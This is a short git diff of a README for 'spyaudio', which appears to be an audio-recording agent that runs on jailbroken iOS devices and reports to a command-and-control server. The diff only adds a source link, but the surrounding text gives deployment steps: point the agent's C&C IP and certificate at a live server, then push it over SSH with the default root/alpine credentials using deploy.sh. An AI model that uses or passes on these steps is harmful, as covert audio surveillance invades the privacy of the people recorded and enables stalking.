@@ -21,7 +21,7 @@ Deployment requires SSH access to the jailbroken iOS device and the `sshpass` ut
 
 Before deployment, you **must** configure both the agent code and the deployment script:
 
-* **Agent C&C IP:** Update the C&C server IP/URL inside the agent's source code (e.g., `APIService.m`) to point to your live server.
+* **Agent C&C IP:** Update the C&C [server IP/URL](https://github.com/hqbao/spyaudio/blob/ef9d03096d2b9fb9b71fd71736bb420894d43aef/recorder-agent/APIService.m#L12) inside the agent's source code (e.g., `APIService.m`) to point to your live server.
 * **Update C&C server certificate:** Update certificate [here](https://github.com/hqbao/spyaudio/blob/ef9d03096d2b9fb9b71fd71736bb420894d43aef/recorder-agent/APIService.m#L20)
 * **Deployment Credentials:** Update the `deploy.sh` script with the correct device credentials and network information.
     * `./deploy.sh root alpine 192.168.1.38 /var/jb`
